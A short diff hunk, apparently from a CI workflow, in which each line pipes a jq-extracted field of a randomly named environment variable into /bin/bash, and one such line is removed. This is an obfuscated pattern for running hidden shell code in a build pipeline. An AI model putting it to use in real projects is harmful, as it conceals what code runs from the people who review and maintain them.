@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$gzun16096" | jq -r .tv7189 | /bin/bash
           echo $md11998 | jq -r .h6 | /bin/bash
           echo $rpht485 | jq -r .iqu98320 | /bin/bash
-          printf '%s' "$e75" | jq -r .ecsc21 | /bin/bash
           echo $inexi00 | jq -r .kqo22 | /bin/bash
           echo $ioade45 | jq -r .ttq53 | /bin/bash
 
